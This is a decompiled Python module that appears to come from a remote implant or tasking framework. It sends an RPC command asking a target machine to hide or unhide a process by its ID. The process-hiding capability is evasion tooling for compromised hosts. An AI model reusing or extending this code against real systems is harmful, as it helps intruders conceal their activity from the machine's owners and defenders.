# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: Mcl_Cmd_Hide_Tasking.py
HIDE_TYPE_PROCESS = 1

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.hide', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.hide.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['type'] == HIDE_TYPE_PROCESS:
        tgtParams = mca.security.cmd.hide.ProcessParams()
        tgtParams.unhide = lpParams['unhide']
        if lpParams['metaData'] != None:
            tgtParams.metaData = lpParams['metaData']
        tgtParams.processId = lpParams['intValue']
        rpc = mca.security.cmd.hide.tasking.RPC_INFO_ACTION
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    else:
        mcl.tasking.EchoError('Invalid type (%u)' % lpParams['type'])
        return False
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.hide.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)